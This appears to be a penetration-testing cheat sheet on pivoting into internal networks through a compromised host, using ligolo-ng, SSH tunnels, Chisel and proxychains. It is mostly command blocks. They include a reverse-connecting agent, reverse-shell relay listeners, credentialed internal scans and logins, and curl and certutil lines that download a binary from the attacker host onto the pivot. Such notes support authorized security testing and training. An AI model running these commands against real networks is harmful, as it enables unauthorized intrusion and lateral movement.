# Pivoting — [Back to Main](../README.md)

Gain access to networks unreachable directly from your attack box by routing traffic through a compromised host.

---

## ligolo-ng (Recommended)

Transparent proxy — no proxychains needed. Traffic routes natively.

### Setup

```bash
# LHOST: create tunnel interface (one time)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# LHOST: start proxy (listens on 11601 by default)
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Deploy agent on pivot host

```bash
# Transfer agent binary to pivot host
# Linux pivot:
./agent -connect $LHOST:11601 -ignore-cert
# Windows pivot:
agent.exe -connect $LHOST:11601 -ignore-cert
```

### In the ligolo-ng console

```
>> session          # select agent
>> ifconfig         # see networks the pivot can reach
>> start            # start tunnel
```

### Add route on LHOST

```bash
# Route traffic for internal subnet through ligolo interface
sudo ip route add 172.16.1.0/24 dev ligolo
# Now scan/attack 172.16.1.x directly — no proxychains
nmap -sT -p- 172.16.1.10
```

### Expose a listener on the pivot (receive reverse shells from deep network)

```
>> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
# Any connection to pivot:4444 forwards to LHOST:4444
# Reverse shell payload on deep target: LHOST = pivot IP, LPORT = 4444
```

### Double pivot (LHOST → Pivot1 → Pivot2 → Target)

```bash
# On Pivot1: run agent (already done)
# Pivot2 agent needs to reach ligolo proxy — use Pivot1 as relay:
# In ligolo-ng console on session 1 (Pivot1):
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# On Pivot2: connect through Pivot1
./agent -connect <pivot1_internal_ip>:11601 -ignore-cert

# Back in ligolo-ng console: new session for Pivot2 appears
# Add route for Pivot2's subnet
sudo ip route add 10.10.2.0/24 dev ligolo
```

---

## SSH Tunneling

### Local port forward (access a service on the internal network)

```bash
# Access target:targetport as localhost:localport via a pivot with SSH
ssh -L localport:target_internal_ip:targetport user@pivot -N -f

# Example: access RDP on 172.16.1.10 through pivot
ssh -L 3389:172.16.1.10:3389 user@pivot -N -f
xfreerdp /u:admin /p:pass /v:127.0.0.1
```

### Dynamic SOCKS proxy (route all traffic via pivot)

```bash
ssh -D 1080 user@pivot -N -f

# /etc/proxychains4.conf — add at end:
# socks5 127.0.0.1 1080

proxychains4 nmap -sT -Pn -p 80,443,445 172.16.1.0/24
proxychains4 nxc smb 172.16.1.10 -u user -p pass
proxychains4 evil-winrm -i 172.16.1.10 -u user -p pass
```

### Remote port forward (expose LHOST service to pivot's network)

```bash
# Make LHOST's port 80 available as pivot:8080 (for reverse shells from internal hosts)
ssh -R 8080:127.0.0.1:80 user@pivot -N -f
# On RHOST internal: curl http://127.0.0.1:8080/shell.exe
```

---

## Chisel (Alternative — useful when SSH unavailable)

```bash
# LHOST — server
./chisel server -p 8080 --reverse

# Pivot host — connect back and create SOCKS proxy on LHOST:1080
./chisel client $LHOST:8080 R:socks

# Use with proxychains4 same as SSH dynamic above

# Direct port forward (instead of SOCKS)
./chisel client $LHOST:8080 R:3389:172.16.1.10:3389
# RDP to 172.16.1.10 via localhost:3389
```

---

## ProxyChains Configuration

```bash
# /etc/proxychains4.conf
# Comment out proxy_dns if it causes issues
# Change socks4 9050 to:
socks5  127.0.0.1  1080    # for SSH -D or chisel SOCKS

# Use strict_chain for ordered proxies (double pivot):
strict_chain
socks5  127.0.0.1  1080    # first hop
socks5  127.0.0.1  1081    # second hop
```

---

## Transferring Binaries to Pivot Host

```bash
# Linux pivot: one-liner download
curl http://$LHOST:8000/agent -o /tmp/agent && chmod +x /tmp/agent

# Windows pivot: certutil or PowerShell
certutil.exe -urlcache -f http://$LHOST:8000/agent.exe C:\Windows\Temp\agent.exe
```
